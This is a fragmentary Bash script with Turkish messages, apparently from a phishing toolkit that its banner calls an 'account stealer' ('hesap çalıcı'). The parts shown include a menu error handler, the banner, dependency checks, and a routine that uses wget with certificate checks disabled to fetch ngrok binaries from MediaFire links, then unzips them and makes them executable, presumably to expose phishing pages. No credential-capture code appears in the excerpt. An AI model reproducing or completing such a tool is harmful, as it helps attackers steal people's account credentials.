...
printf "\e[1;93m [!] HATALI SEÇENEK\e[0m\n"
sleep 1
clear
menu
fi
...
printf "\e[1;77m ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝ \e[0m\n"
printf "\n"
printf "\e[1;93m       .:.:.\e[0m\e[1;77m hesap çalıcı\e[0m\e[1;93m.:.:.\e[0m\n"
printf "\n"
}
...
command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip e ihtiyacım var ama kurulu değil. Yükle. İptal ediliyor."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "Wget'e ihtiyacım var ama kurulu değil. Yükle. İptal ediliyor."; exit 1; }
printf "\e[1;92m[\e[0m*\e[1;92m] ngrok indiriliyor...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://download947.mediafire.com/bfay244rlx2g/2bcw3o0zc24zdf2/ngrok-stable-linux-arm.zips > /dev/null 2>&1
...
printf "\e[1;93m[!]İndirme hatası... Termux, çalıştırın:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi
...
wget --no-check-certificate https://download1651.mediafire.com/8n5n5axoz0mg/bja11qg17u1v7ia/ngrok-stable-linux-386.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] indirme hatası \e[0m\n"
exit 1
fi
fi
fi
